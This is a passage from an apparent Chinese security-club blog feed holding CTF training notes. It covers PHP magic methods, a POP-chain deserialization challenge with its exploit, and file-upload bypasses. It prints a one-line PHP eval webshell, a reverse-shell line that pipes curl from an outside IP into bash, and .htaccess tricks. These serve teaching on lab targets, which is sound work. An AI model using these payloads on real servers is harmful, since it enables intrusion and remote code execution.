class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass1</span>(<span class="string">&quot;ZQJ&quot;</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">BaseClass2</span>(<span class="string">&quot;ZQJ&quot;</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><h3 id="tostring"><a href="#tostring" class="headerlink" title="__tostring()"></a>__tostring()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$sex</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="string">&quot;ZQJ&quot;</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$sex</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="string">&quot;ZQJ&quot;</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>();</span><br></pre></td></tr></table></figure><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$sex</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="string">&quot;ZQJ&quot;</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">clone</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><h2 id="pop链构造例题"><a href="#pop链构造例题" class="headerlink" title="pop链构造例题"></a>pop链构造例题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;p = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【2023】XJUSEC春节培训--文件上传</title>
      <link href="/posts/634/"/>
      <url>/posts/634/</url>
      
        <content type="html"><![CDATA[<h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>在很多的渗透过程中，渗透人员会上传一句话木马(Webshell)到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此。</p><p>基本应用为利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过工具即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。<br>————————————————<br>版权声明：本文为CSDN博主「Tr0e」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p></blockquote><h3 id="一句话木马实例"><a href="#一句话木马实例" class="headerlink" title="一句话木马实例"></a>一句话木马实例</h3><p>下面是最简单的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$_POST用来获取参数值</p><p>@eval()用于免报错代码执行</p><p>因此直接向该页面传参即可执行代码</p><blockquote><p>详见靶机<a href="http://192.168.88.128:8000/challenges#Upload1">upload1</a></p><p>反弹shell：curl 110.40.136.140|bash</p></blockquote><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><blockquote><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;Upload Success！&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详见靶机<a href="http://192.168.88.128:8000/challenges#Upload2">upload0</a></p><h3 id="Challenge1-前端过滤"><a href="#Challenge1-前端过滤" class="headerlink" title="Challenge1-前端过滤"></a>Challenge1-前端过滤</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) === -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            <span class="title function_">alert</span>(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>详见靶机<a href="http://192.168.88.128:8000/challenges#Upload3">Challenge1</a></p><p>解题思路：可使用burp更改文件后缀后再上传</p><h3 id="Challenge2-后端过滤php"><a href="#Challenge2-后端过滤php" class="headerlink" title="Challenge2-后端过滤php"></a>Challenge2-后端过滤php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;嘿，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详见靶机<a href="http://192.168.88.128:8000/challenges#Upload4">Challenge2</a></p><p>解题思路：寻找其他后缀或使用其他方法，正文需要其他可绕过的一句话</p><h3 id="Challenge3-后端过滤php且检测文件头"><a href="#Challenge3-后端过滤php且检测文件头" class="headerlink" title="Challenge3-后端过滤php且检测文件头"></a>Challenge3-后端过滤php且检测文件头</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$file_name</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详见靶机<a href="http://192.168.88.128:8000/challenges#Upload5">Challenge3</a></p><blockquote><p>什么是文件头？</p><p>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分，描述一个文件的一些重要的属性。</p><h4 id="图片类"><a href="#图片类" class="headerlink" title="图片类"></a>图片类</h4><table><thead><tr><th>文件类型</th><th>后缀</th><th>文件头</th><th>文件尾</th><th>标志</th></tr></thead><tbody><tr><td>JPEG</td><td>.jpg&#x2F;.jpeg</td><td>FFD8FF</td><td>FFD9</td><td>JFIF</td></tr><tr><td>PNG</td><td>.png</td><td>89504E47</td><td>AE426082</td><td>PNG IEND IHDR</td></tr><tr><td>GIF</td><td>.gif</td><td>47494638</td><td>003B</td><td>GIT9a</td></tr><tr><td>TIFF</td><td>.tif&#x2F;.tiff</td><td>49492A00</td><td>4D4D2A00</td><td>- II MM</td></tr></tbody></table><h4 id="音频类"><a href="#音频类" class="headerlink" title="音频类"></a>音频类</h4><table><thead><tr><th>文件类型</th><th>后缀</th><th>文件头</th><th>文件尾</th><th>标志</th></tr></thead><tbody><tr><td>WAVE</td><td>.wav</td><td>52494646</td><td>-</td><td>RIFF</td></tr></tbody></table><h4 id="压缩文件类"><a href="#压缩文件类" class="headerlink" title="压缩文件类"></a>压缩文件类</h4><table><thead><tr><th>文件类型</th><th>后缀</th><th>文件头</th><th>文件尾</th><th>标志</th></tr></thead><tbody><tr><td>ZIP Archive</td><td>.zip</td><td>504B0304</td><td>-</td><td>PK</td></tr><tr><td>RAR Archive</td><td>.rar</td><td>52617221</td><td>-</td><td>RAR!</td></tr><tr><td>7Z Archive</td><td>.7z</td><td>377ABCAF</td><td>-</td><td>7z</td></tr></tbody></table></blockquote><p>解题思路：使用一像素图片+一句话转为其他后缀</p><h3 id="Challenge4-后端过滤大量后缀但可更改解析方式"><a href="#Challenge4-后端过滤大量后缀但可更改解析方式" class="headerlink" title="Challenge4-后端过滤大量后缀但可更改解析方式"></a>Challenge4-后端过滤大量后缀但可更改解析方式</h3><blockquote><p>.htaccess文件是Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>, <span class="string">&quot;.php5&quot;</span>, <span class="string">&quot;.php4&quot;</span>, <span class="string">&quot;.php3&quot;</span>, <span class="string">&quot;.php2&quot;</span>, <span class="string">&quot;.php1&quot;</span>, <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.htm&quot;</span>, <span class="string">&quot;.phtml&quot;</span>, <span class="string">&quot;.pht&quot;</span>, <span class="string">&quot;.pHp&quot;</span>, <span class="string">&quot;.pHp5&quot;</span>, <span class="string">&quot;.pHp4&quot;</span>, <span class="string">&quot;.pHp3&quot;</span>, <span class="string">&quot;.pHp2&quot;</span>, <span class="string">&quot;.pHp1&quot;</span>, <span class="string">&quot;.Html&quot;</span>, <span class="string">&quot;.Htm&quot;</span>, <span class="string">&quot;.pHtml&quot;</span>, <span class="string">&quot;.jsp&quot;</span>, <span class="string">&quot;.jspa&quot;</span>, <span class="string">&quot;.jspx&quot;</span>, <span class="string">&quot;.jsw&quot;</span>, <span class="string">&quot;.jsv&quot;</span>, <span class="string">&quot;.jspf&quot;</span>, <span class="string">&quot;.jtml&quot;</span>, <span class="string">&quot;.jSp&quot;</span>, <span class="string">&quot;.jSpx&quot;</span>, <span class="string">&quot;.jSpa&quot;</span>, <span class="string">&quot;.jSw&quot;</span>, <span class="string">&quot;.jSv&quot;</span>, <span class="string">&quot;.jSpf&quot;</span>, <span class="string">&quot;.jHtml&quot;</span>, <span class="string">&quot;.asp&quot;</span>, <span class="string">&quot;.aspx&quot;</span>, <span class="string">&quot;.asa&quot;</span>, <span class="string">&quot;.asax&quot;</span>, <span class="string">&quot;.ascx&quot;</span>, <span class="string">&quot;.ashx&quot;</span>, <span class="string">&quot;.asmx&quot;</span>, <span class="string">&quot;.cer&quot;</span>, <span class="string">&quot;.aSp&quot;</span>, <span class="string">&quot;.aSpx&quot;</span>, <span class="string">&quot;.aSa&quot;</span>, <span class="string">&quot;.aSax&quot;</span>, <span class="string">&quot;.aScx&quot;</span>, <span class="string">&quot;.aShx&quot;</span>, <span class="string">&quot;.aSmx&quot;</span>, <span class="string">&quot;.cEr&quot;</span>, <span class="string">&quot;.sWf&quot;</span>, <span class="string">&quot;.swf&quot;</span>, <span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure><p>详见靶机<a href="http://192.168.88.128:8000/challenges#Upload6">Challenge4</a></p><p>解题思路：将php伪造为jpg之后再上传.htaccess文件将图片文件转为php解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><h3 id="Challenge5-htaccess截断绕过后端检测"><a href="#Challenge5-htaccess截断绕过后端检测" class="headerlink" title="Challenge5-.htaccess截断绕过后端检测"></a>Challenge5-.htaccess截断绕过后端检测</h3><p>详见靶机<a href="http://192.168.88.128:8000/challenges#Upload7">Challenge5</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-ph</span><br><span class="line">p .jpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XJUSEC开发经验分享（一）——py开发环境</title>
      <link href="/posts/35507/"/>
      <url>/posts/35507/</url>
      
